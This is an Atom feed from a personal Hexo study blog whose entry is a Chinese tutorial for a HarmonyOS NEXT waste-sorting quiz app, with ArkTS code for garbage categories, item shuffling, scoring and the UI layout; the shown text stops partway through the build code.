<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>M Study Log</title>
  
  
  <link href="https://banjinmei.github.io/atom.xml" rel="self"/>
  
  <link href="https://banjinmei.github.io/"/>
  <updated>2024-12-15T08:58:35.275Z</updated>
  <id>https://banjinmei.github.io/</id>
  
  <author>
    <name>m</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>HarmonryOS Next Waste Sorting</title>
    <link href="https://banjinmei.github.io/2024/12/15/HarmonryOS-Next-waste-sorting/"/>
    <id>https://banjinmei.github.io/2024/12/15/HarmonryOS-Next-waste-sorting/</id>
    <published>2024-12-15T07:33:54.000Z</published>
    <updated>2024-12-15T08:58:35.275Z</updated>
    
    <content type="html"><![CDATA[<h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p>DevEco Studio NEXT Beta1 Build Version: 5.0<br>API 13</p><h1 id="Waste-Sorting"><a href="#Waste-Sorting" class="headerlink" title="Waste Sorting"></a>Waste Sorting</h1><p>垃圾分类 </p><h2 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//springCurve回弹</span></span><br><span class="line"><span class="title function_">animateToImmediately</span>(&#123;</span><br><span class="line">    <span class="attr">duration</span>:<span class="number">800</span>,</span><br><span class="line">    <span class="attr">curve</span>: curves.<span class="title function_">springCurve</span>(<span class="number">0</span>, <span class="number">20</span>, <span class="number">90</span>, <span class="number">20</span>),</span><br><span class="line">    <span class="comment">// 其他配置</span></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>初始偏移量、振幅、周期和阻尼系数，通过这些参数可以控制动画的弹性效果</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Fisher-Yates洗牌</span></span><br><span class="line"><span class="title function_">shuffleItems</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">garbageItems</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>));</span><br><span class="line">        <span class="keyword">let</span> temp = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i] = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j];</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; curves &#125; <span class="keyword">from</span> <span class="string">&#x27;@kit.ArkUI&#x27;</span>; <span class="comment">// 导入ArkUI工具包中的曲线模块</span></span><br><span class="line"><span class="comment">// 定义垃圾项目类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GarbageItem</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string; <span class="comment">// 垃圾名称</span></span><br><span class="line">  <span class="attr">type</span>: number; <span class="comment">// 垃圾类型</span></span><br><span class="line">  description?: string; <span class="comment">// 垃圾描述，可选</span></span><br><span class="line">  <span class="comment">// 构造函数初始化垃圾项目</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: string, type: number, description?: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name; <span class="comment">// 设置垃圾名称</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">type</span> = type; <span class="comment">// 设置垃圾类型</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">description</span> = description || <span class="string">&quot;&quot;</span>; <span class="comment">// 设置垃圾描述，默认为空字符串</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 定义垃圾类别类</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">GarbageCategory</span> &#123;</span><br><span class="line">  <span class="attr">name</span>: string; <span class="comment">// 类别名称</span></span><br><span class="line">  <span class="attr">type</span>: number; <span class="comment">// 类别类型</span></span><br><span class="line">  <span class="attr">color</span>: string; <span class="comment">// 类别颜色</span></span><br><span class="line">  <span class="attr">description</span>: string; <span class="comment">// 类别描述</span></span><br><span class="line">  <span class="comment">// 构造函数初始化垃圾类别</span></span><br><span class="line">  <span class="title function_">constructor</span>(<span class="params">name: string, type: number, color: string, description: string</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">name</span> = name; <span class="comment">// 设置类别名称</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">type</span> = type; <span class="comment">// 设置类别类型</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">color</span> = color; <span class="comment">// 设置类别颜色</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">description</span> = description; <span class="comment">// 设置类别描述</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 使用组件装饰器定义一个名为Index的应用入口</span></span><br><span class="line">@<span class="title class_">Entry</span></span><br><span class="line">@<span class="title class_">Component</span></span><br><span class="line">struct <span class="title class_">Index</span> &#123;</span><br><span class="line">  <span class="comment">// 定义状态变量</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">currentQuestionIndex</span>: number = <span class="number">0</span>; <span class="comment">// 当前题目索引</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">quizResults</span>: string[] = []; <span class="comment">// 测验结果数组</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">totalScore</span>: number = <span class="number">0</span>; <span class="comment">// 总得分</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">showAnimation</span>: boolean = <span class="literal">false</span>; <span class="comment">// 是否显示动画</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">scaleOptions</span>: <span class="title class_">ScaleOptions</span> = &#123; <span class="attr">x</span>: <span class="number">1</span>, <span class="attr">y</span>: <span class="number">1</span> &#125;; <span class="comment">// 缩放选项</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">itemXPosition</span>: number = <span class="number">0</span>; <span class="comment">// 物品X轴位置</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">itemOpacity</span>: number = <span class="number">1.0</span>; <span class="comment">// 物品透明度</span></span><br><span class="line">  <span class="comment">// 初始化垃圾类别数组</span></span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">garbageCategories</span>: <span class="title class_">GarbageCategory</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;有害垃圾&quot;</span>, <span class="number">0</span>, <span class="string">&quot;#e2413f&quot;</span>, <span class="string">&quot;对人体健康或自然环境可能造成直接或潜在危害的生活垃圾&quot;</span>), <span class="comment">// 创建有害垃圾类别</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;可回收物&quot;</span>, <span class="number">1</span>, <span class="string">&quot;#1c6bb5&quot;</span>, <span class="string">&quot;适宜回收和资源利用的物品&quot;</span>), <span class="comment">// 创建可回收物类别</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;厨余垃圾&quot;</span>, <span class="number">2</span>, <span class="string">&quot;#4ca84e&quot;</span>, <span class="string">&quot;上海称湿垃圾，易腐烂的、含有机质的生活垃圾&quot;</span>), <span class="comment">// 创建厨余垃圾类别</span></span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageCategory</span>(<span class="string">&quot;其他垃圾&quot;</span>, <span class="number">3</span>, <span class="string">&quot;#5f5f5f&quot;</span>, <span class="string">&quot;上海称干垃圾，不能归类于以上三类的生活垃圾&quot;</span>), <span class="comment">// 创建其他垃圾类别</span></span><br><span class="line">  ];</span><br><span class="line">  @<span class="title class_">State</span> <span class="attr">garbageItems</span>: <span class="title class_">GarbageItem</span>[] = [</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;菜帮菜叶&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;剩菜剩饭&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;过期食品&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;瓜果皮壳&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;鱼骨鱼刺&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;鸡蛋及蛋壳&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;残枝落叶&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;茶叶渣&quot;</span>, <span class="number">2</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;酒瓶&quot;</span>, <span class="number">1</span>,),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;玻璃杯&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;调味瓶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;图书&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;打印纸&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;信封&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;易拉罐&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;金属刀具&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;奶粉桶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;衣服裤子&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;毛绒玩具&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;鞋&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;饮料瓶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;塑料盆&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;食用油桶&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;洗衣机&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;电烤箱&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;电视机&quot;</span>, <span class="number">1</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;充电电池&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;废含汞荧光灯管&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;过期药品及其包装物&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;油漆桶&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;血压计&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;废水银温度计&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;杀虫喷雾罐&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;废X光片等感光胶片&quot;</span>, <span class="number">0</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;食品袋&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;大棒骨&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;创可贴&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;污损塑料袋&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;烟屁&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;陶瓷碎片&quot;</span>, <span class="number">3</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;餐巾纸&quot;</span>, <span class="number">3</span>, <span class="string">&quot;厕纸、卫生纸遇水即溶，不算可回收的“纸张”，类似的还有烟盒等。&quot;</span>),</span><br><span class="line">    <span class="keyword">new</span> <span class="title class_">GarbageItem</span>(<span class="string">&quot;卫生纸&quot;</span>, <span class="number">3</span>, <span class="string">&quot;厕纸、卫生纸遇水即溶，不算可回收的“纸张”，类似的还有烟盒等。&quot;</span>),</span><br><span class="line">  ];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 在组件即将出现时重置测验</span></span><br><span class="line">  <span class="title function_">aboutToAppear</span>(): <span class="keyword">void</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">resetQuiz</span>(); <span class="comment">// 调用重置测验方法</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 重置测验状态</span></span><br><span class="line">  <span class="title function_">resetQuiz</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">quizResults</span> = []; <span class="comment">// 清空测验结果</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">totalScore</span> = <span class="number">0</span>; <span class="comment">// 清零总得分</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span> = <span class="number">0</span>; <span class="comment">// 重置当前题目索引</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">shuffleItems</span>(); <span class="comment">// 打乱垃圾项目顺序</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 打乱垃圾项目顺序</span></span><br><span class="line">  <span class="title function_">shuffleItems</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="variable language_">this</span>.<span class="property">garbageItems</span>.<span class="property">length</span> - <span class="number">1</span>; i &gt; <span class="number">0</span>; i--) &#123;</span><br><span class="line">      <span class="keyword">const</span> j = <span class="title class_">Math</span>.<span class="title function_">floor</span>(<span class="title class_">Math</span>.<span class="title function_">random</span>() * (i + <span class="number">1</span>)); <span class="comment">// 随机索引</span></span><br><span class="line">      <span class="keyword">let</span> temp = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i]; <span class="comment">// 临时存储</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">garbageItems</span>[i] = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j]; <span class="comment">// 交换位置</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">garbageItems</span>[j] = temp; <span class="comment">// 交换位置</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 检查用户选择的答案</span></span><br><span class="line">  <span class="title function_">checkAnswer</span>(<span class="params">categoryType: number</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> currentItem = <span class="variable language_">this</span>.<span class="property">garbageItems</span>[<span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span>]; <span class="comment">// 获取当前垃圾项目</span></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">quizResults</span>.<span class="title function_">push</span>(<span class="string">`<span class="subst">$&#123;currentItem.name&#125;</span>（<span class="subst">$&#123;<span class="variable language_">this</span>.garbageCategories[categoryType].name&#125;</span>）【<span class="subst">$&#123;currentItem.type === categoryType ? <span class="string">&quot;✔&quot;</span> : <span class="variable language_">this</span>.garbageCategories[currentItem.type].name&#125;</span>】`</span>); <span class="comment">// 添加到测验结果中</span></span><br><span class="line">    <span class="keyword">if</span> (currentItem.<span class="property">type</span> === categoryType) &#123; <span class="comment">// 如果答案正确</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="property">totalScore</span> += <span class="number">10</span>; <span class="comment">// 加十分</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span>++; <span class="comment">// 进入下一个题目</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">currentQuestionIndex</span> &gt;= <span class="number">10</span>) &#123; <span class="comment">// 如果完成了十个题目</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">displayResults</span>(); <span class="comment">// 显示结果</span></span><br><span class="line">      <span class="variable language_">this</span>.<span class="title function_">resetQuiz</span>(); <span class="comment">// 重置测验</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 显示测验结果</span></span><br><span class="line">  <span class="title function_">displayResults</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> <span class="attr">sheets</span>: <span class="title class_">SheetInfo</span>[] = []; <span class="comment">// 初始化结果页面列表</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="variable language_">this</span>.<span class="property">quizResults</span>.<span class="property">length</span>; i++) &#123; <span class="comment">// 循环添加每一个结果</span></span><br><span class="line">      sheets.<span class="title function_">push</span>(&#123;</span><br><span class="line">        <span class="attr">title</span>: <span class="variable language_">this</span>.<span class="property">quizResults</span>[i], <span class="comment">// 设置标题为测验结果</span></span><br><span class="line">        <span class="attr">action</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 不执行任何操作</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">getUIContext</span>().<span class="title function_">showActionSheet</span>(&#123; <span class="comment">// 显示结果页</span></span><br><span class="line">      <span class="attr">title</span>: <span class="string">&#x27;成绩单&#x27;</span>, <span class="comment">// 标题</span></span><br><span class="line">      <span class="attr">message</span>: <span class="string">`总分数:<span class="subst">$&#123;<span class="variable language_">this</span>.totalScore&#125;</span>`</span>, <span class="comment">// 分数信息</span></span><br><span class="line">      <span class="attr">confirm</span>: &#123; <span class="comment">// 确认按钮</span></span><br><span class="line">        <span class="attr">defaultFocus</span>: <span class="literal">true</span>, <span class="comment">// 默认焦点</span></span><br><span class="line">        <span class="attr">value</span>: <span class="string">&#x27;我知道了&#x27;</span>, <span class="comment">// 按钮文本</span></span><br><span class="line">        <span class="attr">action</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 点击后的动作</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">onWillDismiss</span>: <span class="function">() =&gt;</span> &#123; <span class="comment">// 关闭前的动作</span></span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="attr">alignment</span>: <span class="title class_">DialogAlignment</span>.<span class="property">Center</span>, <span class="comment">// 对齐方式为中心</span></span><br><span class="line">      <span class="attr">sheets</span>: sheets <span class="comment">// 结果页面列表</span></span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">// 构建用户界面</span></span><br><span class="line">  <span class="title function_">build</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title class_">Column</span>() &#123; <span class="comment">// 创建列布局</span></span><br><span class="line">      <span class="title class_">Text</span>(<span class="string">`垃圾分类测验:<span class="subst">$&#123;<span class="variable language_">this</span>.currentQuestionIndex + <span class="number">1</span>&#125;</span>/10`</span>) <span class="comment">// 显示当前题目序号</span></span><br><span class="line">        .<span class="title function_">fontSize</span>(<span class="string">&#x27;30lpx&#x27;</span>) <span class="comment">// 设置字体大小</span></span><br><span class="line">        .<span class="title function_">margin</span>(<span class="number">20</span>); <span class="comment">// 设置外边距</span></span><br><span class="line">      <span class="title class_">Stack</span>() &#123; <span class="comment">// 创建堆栈布局</span></span><br><span class="line">        <span class="title class_">Text</span>(<span class="string">`<span class="subst">$&#123;<span class="variable language_">this</span>.garbageItems[<span class="variable language_">this</span>.currentQuestionIndex].name&#125;</span>`</span>) <span class="comment">// 显示当前垃圾项目名称</span></span><br><span class="line">          .<span class="title function_">textAlign</span>(<span class="title class_">TextAlign</span>.<span class="property">Center</span>) <span class="comment">// 居中对齐</span></span><br><span class="line">          .<span class="title function_">width</span>(<span class="string">&#x27;130lpx&#x27;</span>) <span class="comment">// 设置宽度</span></span><br><span class="line">          .<span class="title 